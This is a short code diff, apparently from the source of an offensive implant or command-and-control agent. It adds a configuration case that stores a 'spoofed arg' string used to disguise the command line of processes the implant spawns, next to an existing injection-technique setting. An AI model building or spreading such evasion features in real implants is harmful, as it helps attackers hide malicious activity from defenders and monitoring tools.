@@ -1573,6 +1573,16 @@ auto DECLFN Task::Config(
                 KhDbg("Injection technique id set: %d", InjectionId);
                 break;
             }
+            case Enm::Config::Argue: {
+                ULONG  ArgLen = 0;
+                WCHAR* Argue  = Self->Psr->Wstr( Parser, &ArgLen );
+
+                Self->Config.Ps.SpoofArg = Argue;
+
+                KhDbg("Spoofed arg set: %S", Argue);
+
+                break;
+            }
         }        
     }
 
